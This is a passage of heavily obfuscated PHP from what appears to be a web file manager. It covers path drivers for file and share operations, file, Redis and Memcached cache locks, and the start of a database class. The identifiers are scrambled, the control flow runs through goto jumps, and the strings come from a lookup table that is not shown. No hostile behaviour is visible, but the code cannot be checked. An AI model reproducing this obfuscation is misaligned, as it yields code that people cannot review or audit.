count($f‘Ú≠ﬂËªê[$e‹ƒ∞€ûÑõ[1115]]); $fÀ…¢ñ©…¯++) { $e∏¥›∂Öê™ = $f‘Ú≠ﬂËªê[$e‹ƒ∞€ûÑõ[1115]][$fÀ…¢ñ©…¯]; if ($fÀ…¢ñ©…¯ == count($f‘Ú≠ﬂËªê[$e‹ƒ∞€ûÑõ[1115]]) - 1) { $f≠Œõ„≤⁄¢ = $this->model->mkfile($f≠Œõ„≤⁄¢, $e∏¥›∂Öê™, $f«âÚÀüµ∫, $Fœÿ™◊Û∑Á); break; } $f≠Œõ„≤⁄¢ = $this->model->mkdir($f≠Œõ„≤⁄¢, $e∏¥›∂Öê™, REPEAT_SKIP); } return $this->getPathOuter($f≠Œõ„≤⁄¢); } public function mkdir($d⁄ÛÑÆåäì, $B¢¯ÜÈõÿˆ = REPEAT_SKIP) { $e≥‡È≤Õ€Õ =& $_SERVER[—Ω]; $D”’·µÓí¬ = $this->parse($d⁄ÛÑÆåäì); $d⁄ÛÑÆåäì = $D”’·µÓí¬[$e≥‡È≤Õ€Õ[364]]; for ($c≤∏ÆÎ≥Î∫ = 0; $c≤∏ÆÎ≥Î∫ < count($D”’·µÓí¬[$e≥‡È≤Õ€Õ[1115]]); $c≤∏ÆÎ≥Î∫++) { $f‡§úô¡¬Á = $D”’·µÓí¬[$e≥‡È≤Õ€Õ[1115]][$c≤∏ÆÎ≥Î∫]; $d⁄ÛÑÆåäì = $this->model->mkdir($d⁄ÛÑÆåäì, $f‡§úô¡¬Á, $B¢¯ÜÈõÿˆ); } return $this->getPathOuter($d⁄ÛÑÆåäì); } public function copyFile($bµÊ˜éßÒ , $fºÜÿÔíÖ†, $AÚØîÑ•Û = REPEAT_REPLACE) { $Bûª◊âá˘Ü =& $_SERVER[—Ω]; $F √øÓ„©… = $this->parse($fºÜÿÔíÖ†); $B„ç©’èÓÜ = $this->model->copy($bµÊ˜éßÒ , $F √øÓ„©…[$Bûª◊âá˘Ü[364]], $AÚØîÑ•Û, $F √øÓ„©…[$Bûª◊âá˘Ü[75]]); return $B„ç©’èÓÜ ? $this->getPathOuter($B„ç©’èÓÜ) : !1; } public function moveFile($D‘âœ≤Èã‘, $Eò—¶áÂ‡Ø, $B√õ‚  Ê = REPEAT_REPLACE) { $bÏœäÕùÛÖ =& $_SERVER[—Ω]; $DÿÒﬂØØËö = $this->parse($Eò—¶áÂ‡Ø); $FÔÜáëõ§± = $this->model->move($D‘âœ≤Èã‘, $DÿÒﬂØØËö[$bÏœäÕùÛÖ[364]], $B√õ‚  Ê, $DÿÒﬂØØËö[$bÏœäÕùÛÖ[75]]); return $FÔÜáëõ§± ? $this->getPathOuter($FÔÜáëõ§±) : !1; } public function copy($e≠íˆƒúæô, $Dª†Âê£äÍ, $CÊ©ºéÏÎ = REPEAT_REPLACE) { $C¯¶ë´—–” = $this->parse($Dª†Âê£äÍ); $d‡éÜò‡§Ê = $this->model->copy($e≠íˆƒúæô, $C¯¶ë´—–”[$_SERVER[—Ω][364]], $CÊ©ºéÏÎ); return $d‡éÜò‡§Ê ? $this->getPathOuter($d‡éÜò‡§Ê) : !1; } public function move($Dœá®à⁄æ∏, $e≈õÊ≈áôÂ, $e«–Ø´∞Ã¯ = REPEAT_REPLACE) { $FÆÃË“πˆ› = $this->parse($e≈õÊ≈áôÂ); $fÜÖõéë¿ê = $this->model->move($Dœá®à⁄æ∏, $FÆÃË“πˆ›[$_SERVER[—Ω][364]], $e«–Ø´∞Ã¯); return $fÜÖõéë¿ê ? $this->getPathOuter($fÜÖõéë¿ê) : !1; } public function remove($aÊüÆá√ù¨, $CŸ‹Ñã„π≥ = true) { return $this->model->remove($aÊüÆá√ù¨, $CŸ‹Ñã„π≥); } public function rename($aúΩﬁ∞ãê∆, $e∑¡±ÂÓ™ß) { $fﬁï‚ ¥ÜΩ = $this->model->rename($aúΩﬁ∞ãê∆, $e∑¡±ÂÓ™ß); return $fﬁï‚ ¥ÜΩ ? $this->getPathOuter($aúΩﬁ∞ãê∆) : $fﬁï‚ ¥ÜΩ; } public function size($c≠¡¢›Ò≠Ö) { $b¥®¢ÁüûÖ = $this->infoSimple($c≠¡¢›Ò≠Ö); return $b¥®¢ÁüûÖ ? $b¥®¢ÁüûÖ[$_SERVER[—Ω][77]] : 0; } public function infoSimple($CÚÑó∑±—Ö) { return $this->model->sourceInfo($CÚÑó∑±—Ö); } public function info($A–çÖƒ‘®ü) { return $this->infoParse($A–çÖƒ‘®ü); } public function infoAuth($B∆√›¡ëÃ¶) { return $this->infoParse($B∆√›¡ëÃ¶, !1, !0); } public function infoWithChildren($FÌÁå¶·®Á) { return $this->infoParse($FÌÁå¶·®Á, !0); } protected function infoParse($E‰ÆÃ¶ãÜ‰, $Eﬂ÷ÏÇØãÔ = false, $déÏÒƒù„à = false) { if (!$Eﬂ÷ÏÇØãÔ) { return $this->model->pathInfo($E‰ÆÃ¶ãÜ‰, $déÏÒƒù„à); } return $this->model->pathInfoMore($E‰ÆÃ¶ãÜ‰); } public function infoFull($a∆¿™çÌ®â) { $eÊ‹˜Ñäº€ =& $_SERVER[—Ω]; $DÖºëµÒ≥É = explode($eÊ‹˜Ñäº€[8], $a∆¿™çÌ®â); $dí—É÷∆∂ = implode($eÊ‹˜Ñäº€[8], array_splice($DÖºëµÒ≥É, 1)); return $this->model->pathInfoByPath($DÖºëµÒ≥É[0], $dí—É÷∆∂); } public function hashSimple($AºÁñ¶¬·“) { $bõî›ƒµâ® =& $_SERVER[—Ω]; $B›úΩ–∂¡Ø = $this->infoWithChildren($AºÁñ¶¬·“); return $B›úΩ–∂¡Ø[$bõî›ƒµâ®[159]][$bõî›ƒµâ®[161]]; } public function hashMd5($cÓ±£ô˘ªÆ) { $EÇ§£Ò§Õû =& $_SERVER[—Ω]; $CëŒä•Èá¨ = $this->infoWithChildren($cÓ±£ô˘ªÆ); return $CëŒä•Èá¨[$EÇ§£Ò§Õû[159]][$EÇ§£Ò§Õû[160]]; } public function exist($f†ù÷´Á”≈) { $D°à‚ÀÇ°ü =& $_SERVER[—Ω]; $f †ÆÌÚª„ = $this->parse($f†ù÷´Á”≈); if (!$f †ÆÌÚª„[$D°à‚ÀÇ°ü[75]]) { return $this->isFile($f†ù÷´Á”≈) || $this->isFolder($f†ù÷´Á”≈); } $fä´ñ™∫”ﬂ = array($D°à‚ÀÇ°ü[365] => $f †ÆÌÚª„[$D°à‚ÀÇ°ü[364]], $D°à‚ÀÇ°ü[28] => $f †ÆÌÚª„[$D°à‚ÀÇ°ü[75]]); $FÙëÒ˘•êæ = $this->model->where($fä´ñ™∫”ﬂ)->find(); return $FÙëÒ˘•êæ ? !0 : !1; } public function isFile($dñÕ≈«ÑÙˆ) { $e’ÂøíÌéÀ =& $_SERVER[—Ω]; $AŸëºéæ≤í = $this->infoSimple($dñÕ≈«ÑÙˆ); return $AŸëºéæ≤í && $AŸëºéæ≤í[$e’ÂøíÌéÀ[367]] == $e’ÂøíÌéÀ[83] ? !1 : !0; } public function isFolder($AœØ÷°ﬂó¯) { $E∫÷¶ß–ºá =& $_SERVER[—Ω]; $DªÉÀƒÔá = $this->infoSimple($AœØ÷°ﬂó¯); return $DªÉÀƒÔá && $DªÉÀƒÔá[$E∫÷¶ß–ºá[367]] == $E∫÷¶ß–ºá[83] ? !0 : !1; } public function listPath($eû≠ª¶ﬁ⁄˘, $b¯Ù–â∂≤√ = false) { $bÿ°äáÑÃ° =& $_SERVER[—Ω]; if ($eû≠ª¶ﬁ⁄˘ == $bÿ°äáÑÃ°[33]) { return !1; } $b∫û¬éÙë⁄ = array($bÿ°äáÑÃ°[365] => $eû≠ª¶ﬁ⁄˘); if ($b¯Ù–â∂≤√) { return $this->model->listSource($b∫û¬éÙë⁄, -1); } return $this->model->listSource($b∫û¬éÙë⁄); } public function has($E‹ò¶ãÙÿ‚, $dÖáäî‚¢¥ = false, $FÍ‹ŸŸ∏π⁄ = null) { $F—éÒ±ä™Ø =& $_SERVER[—Ω]; $eÀ¯⁄‚ûø› = $this->infoWithChildren($E‹ò¶ãÙÿ‚); if ($dÖáäî‚¢¥) { return array($F—éÒ±ä™Ø[189] => $eÀ¯⁄‚ûø›[$F—éÒ±ä™Ø[189]], $F—éÒ±ä™Ø[188] => $eÀ¯⁄‚ûø›[$F—éÒ±ä™Ø[188]]); } return $FÍ‹ŸŸ∏π⁄ ? $eÀ¯⁄‚ûø›[$F—éÒ±ä™Ø[189]] : $eÀ¯⁄‚ûø›[$F—éÒ±ä™Ø[188]]; } public function listAll($e⁄÷ª ˘Îå) { $f¥Ø˜∂ﬁóç = IO::info($this->pathParse[$_SERVER[—Ω][75]]); if (!$f¥Ø˜∂ﬁóç) { return array(); } return $this->model->listAll($e⁄÷ª ˘Îå); } public function getContent($eãñ˜Õ¶Ÿ˜) { return $this->model->getContent($eãñ˜Õ¶Ÿ˜); } public function setContent($aå¯∆ÒÉú≠, $fë¨£¿™Í± = '') { return $this->model->setContent($aå¯∆ÒÉú≠, $fë¨£¿™Í±); } public function fileSubstr($fÎ¥ÏÂ »ñ, $FØéŒ«”∫±, $B∆ß≤øèÇ») { return $this->model->fileSubstr($fÎ¥ÏÂ »ñ, $FØéŒ«”∫±, $B∆ß≤øèÇ»); } public function download($AÛà†ﬁÔªÙ, $c÷±˜ã†ƒˆ = '') { $föú˜•Ú‚ú = get_path_father($c÷±˜ã†ƒˆ); $bÔ◊ë∑¨õí = get_path_this($c÷±˜ã†ƒˆ); $aç…„°›πæ = $this->model->fileInfoGet($AÛà†ﬁÔªÙ); $Bƒ÷ÁÉ‘¥ˆ = IO::copy($aç…„°›πæ[$_SERVER[—Ω][75]], $föú˜•Ú‚ú, !1, $bÔ◊ë∑¨õí); return $Bƒ÷ÁÉ‘¥ˆ; } public function upload($Eë°ÊàÕπÀ, $fº¿ó”á∞Î, $Eóï©◊œòõ = false, $cãÍı„≤ÃÖ = REPEAT_REPLACE) { $CÆˆÖ÷úŒ´ =& $_SERVER[—Ω]; $E‰ŸıàºÈø = $this->parse($Eë°ÊàÕπÀ); $A√èﬂ†‚¡ø = $this->model->addFile($E‰ŸıàºÈø[$CÆˆÖ÷úŒ´[364]], $fº¿ó”á∞Î, $E‰ŸıàºÈø[$CÆˆÖ÷úŒ´[75]], $Eóï©◊œòõ, $cãÍı„≤ÃÖ); return $this->getPathOuter($A√èﬂ†‚¡ø); } public function uploadFileByID($eŸï¨…á∏Ç, $d‰Ë◊úˆâ“, $Eá€Ïß©ç) { $d§‰úã·—» =& $_SERVER[—Ω]; $Eªê≠“ºˆò = $this->parse($eŸï¨…á∏Ç); $cı∂í¥›√é = $this->model->addFileByFileID($Eªê≠“ºˆò[$d§‰úã·—»[364]], $d‰Ë◊úˆâ“, $Eªê≠“ºˆò[$d§‰úã·—»[75]], $Eá€Ïß©ç); return $this->getPathOuter($cı∂í¥›√é); } public function addFileByRemote($BœûƒÌÎâµ, $eØÊÒ’ì™«, $B·ÀÂıîÜ… = array(), $eßŒƒ˜¯ƒÁ = '', $B∂¢≥≤á˘•) { $aÙ√ ´ Ö‘ =& $_SERVER[—Ω]; $F‘ìá∑ØÙ¿ = $this->parse($BœûƒÌÎâµ); $eßŒƒ˜¯ƒÁ = empty($eßŒƒ˜¯ƒÁ) ? $F‘ìá∑ØÙ¿[$aÙ√ ´ Ö‘[75]] : $eßŒƒ˜¯ƒÁ; $d–Ú˘ï‘Ç“ = $this->model->addFileByRemote($F‘ìá∑ØÙ¿[$aÙ√ ´ Ö‘[364]], $eØÊÒ’ì™«, $eßŒƒ˜¯ƒÁ, $B·ÀÂıîÜ…, $B∂¢≥≤á˘•); return $this->getPathOuter($d–Ú˘ï‘Ç“); } public function uploadLink($D≈≠”·èµ∏, $CßÕßÒÆ≠å = 0) { $A–Ï‡Î•äˆ =& $_SERVER[—Ω]; $aÍµ¶ü˜Ì∂ = $this->parse($D≈≠”·èµ∏); $D≈≠”·èµ∏ = Model($A–Ï‡Î•äˆ[540])->createFileName($aÍµ¶ü˜Ì∂[$A–Ï‡Î•äˆ[75]]); $D†öäÓ·ßè = IO::uploadLink($D≈≠”·èµ∏, $CßÕßÒÆ≠å); return $D†öäÓ·ßè; } public function fileNameAuto($a¶®¶ŒªÉå, $b„…Ç»üÕÙ, $CÙ¥ŸÙÊµÊ = REPEAT_REPLACE, $d¿èë⁄ÒæÈ = false) { return $this->model->fileNameAuto($a¶®¶ŒªÉå, $b„…Ç»üÕÙ, $CÙ¥ŸÙÊµÊ, $d¿èë⁄ÒæÈ); } public function fileNameExist($eë≈“ª«ø¿, $f≤¥Éöô∑á) { return $this->model->fileNameExist($eë≈“ª«ø¿, $f≤¥Éöô∑á); } protected function _fileOut($b è‰œ≠πâ, $aƒçò ß›ö = false, $CÚã«æòÍπ = false, $eΩàöˆïÆﬁ = '', $C∆ƒ–÷ä» = false) { goto E√‚©ˆŸÕπ; c°Ï°ñÈ⁄ô: $Eà‡î˜ôäµ = $this->model->fileInfoGet($b è‰œ≠πâ); $eΩàöˆïÆﬁ = $Eà‡î˜ôäµ[$bµÇ…ƒÑ‚ç[160]] ? $Eà‡î˜ôäµ[$bµÇ…ƒÑ‚ç[160]] : $eΩàöˆïÆﬁ; $e≥»Èƒîø = isset($GLOBALS[$bµÇ…ƒÑ‚ç[1117]]) ? $GLOBALS[$bµÇ…ƒÑ‚ç[1117]] : $eå’ﬂªß»Ù[$bµÇ…ƒÑ‚ç[28]]; goto b¢†ﬁ©ß∏ë; b¢†ﬁ©ß∏ë: if ($C∆ƒ–÷ä») { return IO::fileOutServer($Eà‡î˜ôäµ[$bµÇ…ƒÑ‚ç[75]], $aƒçò ß›ö, $e≥»Èƒîø, $eΩàöˆïÆﬁ); } IO::fileOut($Eà‡î˜ôäµ[$bµÇ…ƒÑ‚ç[75]], $aƒçò ß›ö, $e≥»Èƒîø, $eΩàöˆïÆﬁ); goto b‘¯«—¶áâ; E√‚©ˆŸÕπ: $bµÇ…ƒÑ‚ç =& $_SERVER[—Ω]; $eå’ﬂªß»Ù = $this->model->sourceInfo($b è‰œ≠πâ); if ($eå’ﬂªß»Ù[$bµÇ…ƒÑ‚ç[367]] == $bµÇ…ƒÑ‚ç[83]) { header($bµÇ…ƒÑ‚ç[1116]); die; } goto c°Ï°ñÈ⁄ô; b‘¯«—¶áâ: } public function fileOut($cŒπ™‚ãË≈, $eïë˘¢Ëˆ˘ = false, $F›ï£éû≤∞ = false, $eÊ≠ª¯Ÿœã = '') { $this->_fileOut($cŒπ™‚ãË≈, $eïë˘¢Ëˆ˘, $F›ï£éû≤∞, $eÊ≠ª¯Ÿœã); } public function fileOutServer($cæ¡∏—ñÏç, $DíÑêû∞¥ê = false, $aÀÖÿ»∞†É = false, $EÇ«É¥ˆ€§ = '') { $this->_fileOut($cæ¡∏—ñÏç, $DíÑêû∞¥ê, $aÀÖÿ»∞†É, $EÇ«É¥ˆ€§, !0); } protected function _fileOutImage($bõ®õÓ≥·ÿ, $fˆˆêÍÌ¨∑ = 250) { $DµÁëΩúÍÑ =& $_SERVER[—Ω]; $F÷˘ÀıâµÕ = $this->model->sourceInfo($bõ®õÓ≥·ÿ); if ($F÷˘ÀıâµÕ[$DµÁëΩúÍÑ[367]] == $DµÁëΩúÍÑ[83]) { show_json($DµÁëΩúÍÑ[1118] . $bõ®õÓ≥·ÿ, !1); } $GLOBALS[$DµÁëΩúÍÑ[1117]] = $F÷˘ÀıâµÕ[$DµÁëΩúÍÑ[28]]; $E¬É–Ü’™… = $this->model->fileInfoGet($bõ®õÓ≥·ÿ); IO::fileOutImage($E¬É–Ü’™…[$DµÁëΩúÍÑ[75]], $fˆˆêÍÌ¨∑); } public function fileOutImage($EòÜ•Ò∫ıÂ, $cÜ–üæ§âÜ = 250) { $this->_fileOutImage($EòÜ•Ò∫ıÂ, $cÜ–üæ§âÜ); } public function fileOutImageServer($eãûªπ◊≥•, $E⁄…â¡œ∑° = 250) { $this->_fileOutImage($eãûªπ◊≥•, $E⁄…â¡œ∑°); } public function link($d∫ì°˜®Æä, $BÛ¢Ú¯ßÉô = '') { $füÛ„“—Ÿà = $this->model->fileInfoGet($d∫ì°˜®Æä); return IO::link($füÛ„“—Ÿà[$_SERVER[—Ω][75]], $BÛ¢Ú¯ßÉô); } protected function parse($A≥ç¢˘™‡‘) { $EﬂáßµïóË =& $_SERVER[—Ω]; if (strstr($A≥ç¢˘™‡‘, $EﬂáßµïóË[8]) === !1) { return array($EﬂáßµïóË[382] => intval($A≥ç¢˘™‡‘), $EﬂáßµïóË[75] => $EﬂáßµïóË[33], $EﬂáßµïóË[1115] => array()); } $c©«ê¥…ÁÓ = explode($EﬂáßµïóË[8], trim($A≥ç¢˘™‡‘, $EﬂáßµïóË[8])); if (count($c©«ê¥…ÁÓ) < 2) { show_tips($A≥ç¢˘™‡‘ . $EﬂáßµïóË[1119]); } return array($EﬂáßµïóË[382] => intval($c©«ê¥…ÁÓ[0]), $EﬂáßµïóË[75] => $c©«ê¥…ÁÓ[1], $EﬂáßµïóË[1115] => array_slice($c©«ê¥…ÁÓ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($Fª±•·Ç≠ã) { $this->pathParse = $Fª±•·Ç≠ã; $this->model = Model($_SERVER[—Ω][1114]); } public function getPathOuter($AÍøÊ∑™¿Ò) { $B¡¬ç¶ê¬¿ =& $_SERVER[—Ω]; if (!$AÍøÊ∑™¿Ò) { return $AÍøÊ∑™¿Ò; } $e€‡ë…ÇÎƒ = $this->parse($AÍøÊ∑™¿Ò); return trim(KodIO::makeShare($this->pathParse[$B¡¬ç¶ê¬¿[364]], $e€‡ë…ÇÎƒ[$B¡¬ç¶ê¬¿[364]]), $B¡¬ç¶ê¬¿[8]); } protected function infoParse($Fœè‘µÁÂ™, $fÏüëåÕ™Î = false, $aÔîúÕ°ä∫ = false) { $DºÀÛ°‡êË =& $_SERVER[—Ω]; $A—åÛ…é†ü = $this->pathParse[$DºÀÛ°‡êË[364]]; $båï„åì•¬ = trim($this->pathParse[$DºÀÛ°‡êË[1015]], $DºÀÛ°‡êË[8]); return Action($DºÀÛ°‡êË[1120])->sharePathInfo($A—åÛ…é†ü, $båï„åì•¬); } public function infoFull($aËÛêÿ∂ˆÚ) { $f≤åÛÉ‘√ =& $_SERVER[—Ω]; $BØêƒ≈∞Ìó = explode($f≤åÛÉ‘√[8], trim($aËÛêÿ∂ˆÚ, $f≤åÛÉ‘√[8])); if (count($BØêƒ≈∞Ìó) > 1) { $Cî“‘∞éÏº = implode($f≤åÛÉ‘√[8], array_splice($BØêƒ≈∞Ìó, 1)); $b£≤¯ƒæÎç = $this->model->pathInfoByPath($BØêƒ≈∞Ìó[0], $Cî“‘∞éÏº); if (!$b£≤¯ƒæÎç) { return !1; } $this->pathParse[$f≤åÛÉ‘√[1015]] = $b£≤¯ƒæÎç[$f≤åÛÉ‘√[366]]; } return $this->infoParse($aËÛêÿ∂ˆÚ); } public function listAll($CßÍ±¢§ÆÓ) { goto E∆à»àåÑà; CÑÊÍÃÍƒç: foreach ($b‹™±‡åáá as &$F¥…çπƒéº) { check_abort(); $F¥…çπƒéº[$FØÉßÕ√¿±[388]] = $e£ÓÛåÏâ ->_shareItemeParse($F¥…çπƒéº[$FØÉßÕ√¿±[388]], $b™»¯ﬂäπå); } return $b‹™±‡åáá; goto bì∏∑Œ¿æÒ; E∆à»àåÑà: $FØÉßÕ√¿± =& $_SERVER[—Ω]; $FÂÖÇãŸÂ√ = IO::info($this->pathParse[$FØÉßÕ√¿±[75]]); if (!$FÂÖÇãŸÂ√) { return array(); } goto CÂÚäõ√ç ; CÂÚäõ√ç : $b‹™±‡åáá = $this->model->listAll($CßÍ±¢§ÆÓ); $b™»¯ﬂäπå = Model($FØÉßÕ√¿±[532])->getInfo($FÂÖÇãŸÂ√[$FØÉßÕ√¿±[437]]); $e£ÓÛåÏâ  = Action($FØÉßÕ√¿±[1120]); goto CÑÊÍÃÍƒç; bì∏∑Œ¿æÒ: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($cúä‡¶ÜÙÂ) { $this->pathParse = $cúä‡¶ÜÙÂ; $this->model = Model($_SERVER[—Ω][1114]); } protected function infoParse($F˜áäúûΩì, $Féæœ…Ìª› = false, $Då®â◊…ëÌ = false) { $EîñÑˆ©ÀΩ =& $_SERVER[—Ω]; return Action($EîñÑˆ©ÀΩ[1021])->sharePathInfo($this->pathParse[$EîñÑˆ©ÀΩ[75]], !0); } public function listPath($C…©âêÙ ∂, $b¬’À¶êË« = false) { $E∆Üƒíˆ˜¬ =& $_SERVER[—Ω]; $a˘®ê∆„ö‹ = parent::listPath($C…©âêÙ ∂, $b¬’À¶êË«); foreach ($a˘®ê∆„ö‹ as $eÕ€æﬂÿÆ => $cı˜πé£èï) { if (!in_array($eÕ€æﬂÿÆ, array($E∆Üƒíˆ˜¬[73], $E∆Üƒíˆ˜¬[74]))) { continue; } foreach ($cı˜πé£èï as $f◊Ì˘‡øô’ => $B»Ç¢Ÿìé¬) { $a˘®ê∆„ö‹[$eÕ€æﬂÿÆ][$f◊Ì˘‡øô’] = Action($E∆Üƒíˆ˜¬[1021])->shareItemInfo($B»Ç¢Ÿìé¬); } } return $a˘®ê∆„ö‹; } public function listAll($aº±∑¨∑¢Ë) { $B£ﬂÉó¥°È =& $_SERVER[—Ω]; $Bı´ëâΩØÆ = IO::info($this->pathParse[$B£ﬂÉó¥°È[75]]); if (!$Bı´ëâΩØÆ) { return array(); } $eô≤Ω•çñ◊ = $this->model->listAll($aº±∑¨∑¢Ë); foreach ($eô≤Ω•çñ◊ as &$dùûÓ≤€òØ) { $dùûÓ≤€òØ[$B£ﬂÉó¥°È[388]] = Action($B£ﬂÉó¥°È[1021])->shareItemInfo($dùûÓ≤€òØ[$B£ﬂÉó¥°È[388]]); } return $eô≤Ω•çñ◊; } } goto DÍèÈÜ‹§è; bÚ¨Óä‹„ß: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $CÇï¯Ã™¬Ê =& $_SERVER[—Ω]; $a∂’ù¢∆âÔ = $GLOBALS[$CÇï¯Ã™¬Ê[6]][$CÇï¯Ã™¬Ê[334]]; self::$cachePath = $a∂’ù¢∆âÔ[$CÇï¯Ã™¬Ê[164]][$CÇï¯Ã™¬Ê[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($A€·Æ™‹œ±, $a‹•ô®«‘ì = 0) { goto f¢ö±Ìñ·ë; f¢ö±Ìñ·ë: $B‰úáí¡⁄à =& $_SERVER[—Ω]; $d˘•ıÆÔ›ó = microtime(!0); $cê‚–∏⁄µΩ = $d˘•ıÆÔ›ó + $a‹•ô®«‘ì + 0.0001; goto EÇ‘Öè†≈√; eúÛÊ∑Êàë: $this->unlock($A€·Æ™‹œ±); return !1; goto AıÂÉÈ›∫ù; EÇ‘Öè†≈√: $b‘Ã‡¥Ú¡à = rtrim(self::$cachePath, $B‰úáí¡⁄à[8]) . $B‰úáí¡⁄à[782] . md5($A€·Æ™‹œ±) . $B‰úáí¡⁄à[783]; if (file_exists($b‘Ã‡¥Ú¡à) && filemtime($b‘Ã‡¥Ú¡à) && filemtime($b‘Ã‡¥Ú¡à) < time() - 10) { @unlink($b‘Ã‡¥Ú¡à); } do { if (file_exists($b‘Ã‡¥Ú¡à)) { cacheLockWait(); continue; } $D»ªÃ Ñ„ä = fopen($b‘Ã‡¥Ú¡à, $B‰úáí¡⁄à[784]); if (!$D»ªÃ Ñ„ä) { return !1; } $eôá‰£Ñ∞√ = flock($D»ªÃ Ñ„ä, LOCK_EX | LOCK_NB); self::$caches[$A€·Æ™‹œ±] = array($B‰úáí¡⁄à[785] => $D»ªÃ Ñ„ä, $B‰úáí¡⁄à[164] => $b‘Ã‡¥Ú¡à); fwrite($D»ªÃ Ñ„ä, $cê‚–∏⁄µΩ); clearstatcache(); if ($D»ªÃ Ñ„ä && $eôá‰£Ñ∞√) { return !0; } cacheLockWait(); } while (microtime(!0) < $cê‚–∏⁄µΩ); goto eúÛÊ∑Êàë; AıÂÉÈ›∫ù: } public function lockGet($b»˘»⁄‹èƒ) { $bÎóÃŒÏã =& $_SERVER[—Ω]; $EÔü∫ï÷öù = rtrim(self::$cachePath, $bÎóÃŒÏã[8]) . $bÎóÃŒÏã[782] . md5($b»˘»⁄‹èƒ) . $bÎóÃŒÏã[783]; return file_exists($EÔü∫ï÷öù); } public function unlock($aÒò’ÜÙÃñ) { goto dÆá¬≤å·Ó; dÆá¬≤å·Ó: $dÜà°§‰◊¿ =& $_SERVER[—Ω]; $Dﬁâ√´¬Œà = self::$caches[$aÒò’ÜÙÃñ]; if (!$Dﬁâ√´¬Œà) { return; } goto Aáûœ≠ê©∑; Aáûœ≠ê©∑: @flock($Dﬁâ√´¬Œà[$dÜà°§‰◊¿[785]], LOCK_UN); @fclose($Dﬁâ√´¬Œà[$dÜà°§‰◊¿[785]]); @unlink($Dﬁâ√´¬Œà[$dÜà°§‰◊¿[164]]); goto c•’ƒÓ»≠ö; c•’ƒÓ»≠ö: unset(self::$caches[$aÒò’ÜÙÃñ]); goto CÒèùíõÃÆ; CÒèùíõÃÆ: } } class CacheLockRedis { public function lock($cñ◊ÿÿ¨ﬁè, $d»ß¥ÜÆä« = 10) { $C“∏ÿµÀ≈ä = Cache::init(); $a´õÿƒ“√– = microtime(!0) + $d»ß¥ÜÆä«; while (microtime(!0) < $a´õÿƒ“√–) { $D‘µ∏πı∏Â = $C“∏ÿµÀ≈ä->get($cñ◊ÿÿ¨ﬁè); if (!$D‘µ∏πı∏Â) { $bäûë¿ ßı = $C“∏ÿµÀ≈ä->setLock($cñ◊ÿÿ¨ﬁè, $a´õÿƒ“√–, $d»ß¥ÜÆä«); if ($bäûë¿ ßı) { return !0; } } else { if ($D‘µ∏πı∏Â < microtime(!0)) { $C“∏ÿµÀ≈ä->set($cñ◊ÿÿ¨ﬁè, $a´õÿƒ“√–, $a´õÿƒ“√–); if ($C“∏ÿµÀ≈ä->get($cñ◊ÿÿ¨ﬁè) === $D‘µ∏πı∏Â) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($cóôæﬁêÌÑ) { return Cache::init()->get($cóôæﬁêÌÑ); } public function unlock($dèù’òâ‰¨) { return Cache::init()->remove($dèù’òâ‰¨); } } class CacheLockMemcached { public function lock($cÇâÃáóŒü, $CÖ≈øÇ™‚≤ = 0) { $C’ü£…¶◊ = Cache::init(); $a«õáä˜ãª = microtime(!0) + $CÖ≈øÇ™‚≤; while (microtime(!0) < $a«õáä˜ãª) { $DÇıÎŒØŸˆ = $C’ü£…¶◊->get($cÇâÃáóŒü); if (!$DÇıÎŒØŸˆ || $DÇıÎŒØŸˆ < microtime(!0)) { $e≤–„ô”‘† = $C’ü£…¶◊->handle->add($cÇâÃáóŒü, $a«õáä˜ãª, $CÖ≈øÇ™‚≤); if ($e≤–„ô”‘†) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($f´ôÒæá´´) { return Cache::init()->get($f´ôÒæá´´); } public function unlock($DµÃÀˆ…é¢) { return Cache::init()->remove($DµÃÀˆ…é¢); } } goto DÁé“äÂ†∑; Fà≈ÿœ¶⁄á: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\151\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\x71" => "\75", "\x6e\x65\x71" => "\x3c\76", "\147\164" => "\76", "\145\147\164" => "\x3e\x3d", "\154\164" => "\74", "\145\154\x74" => "\x3c\75", "\x6e\157\x74\x6c\x69\x6b\145" => "\116\x4f\124\40\114\x49\x4b\105", "\154\x69\x6b\x65" => "\114\111\113\105", "\151\x6e" => "\111\116", "\x6e\x6f\164\x69\x6e" => "\116\117\124\x20\111\x4e", "\x6e\157\164\x20\x69\156" => "\x4e\x4f\124\40\x49\116", "\142\x65\x74\167\x65\x65\x6e" => "\x42\105\124\127\105\105\116", "\x6e\x6f\x74\142\x65\x74\167\x65\145\x6e" => "\x4e\117\x54\x20\x42\105\124\127\105\x45\x4e", "\156\x6f\x74\x20\x62\145\164\167\145\145\x6e" => "\x4e\117\x54\x20\102\105\x54\x57\105\105\116"); protected $selectSql = "\123\x45\x4c\x45\103\x54\45\x44\x49\123\124\x49\x4e\103\x54\45\x20\45\x46\x49\105\x4c\104\45\40\106\122\117\115\x20\45\124\x41\x42\x4c\105\45\x25\112\x4f\111\116\45\x25\127\110\x45\122\x45\45\45\107\122\x4f\x55\120\x25\45\110\101\x56\111\x4e\x47\x25\x25\x4f\122\x44\x45\122\45\x25\x4c\x49\115\111\124\45\40\45\125\116\111\x4f\x4e\45\x25\103\x4f\115\115\105\x4e\124\45"; protected $bind = array(); public static function getInstance() { $cñ“‰™¬¨† = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[—Ω][881], $cñ“‰™¬¨†); } public function factory($Fñã™∑¶“√ = '') { goto aÑèå›§ƒ¥; aÑèå›§ƒ¥: $däâ¶ë—‰Ω =& $_SERVER[—Ω]; $Fñã™∑¶“√ = $this->parseConfig($Fñã™∑¶“√); if (empty($Fñã™∑¶“√[$däâ¶ë—‰Ω[882]])) { think_exception(think_lang($däâ¶ë—‰Ω[883])); } goto fÖ±ö‰Áî•; fÖ±ö‰Áî•: $this->dbType = ucwords(strtolower($Fñã™∑¶“√[$däâ¶ë—‰Ω[882]])); $AÉÀ¯ÕÊÔº = $däâ¶ë—‰Ω[884] . $this->dbType; if (class_exists($AÉÀ¯ÕÊÔº)) { 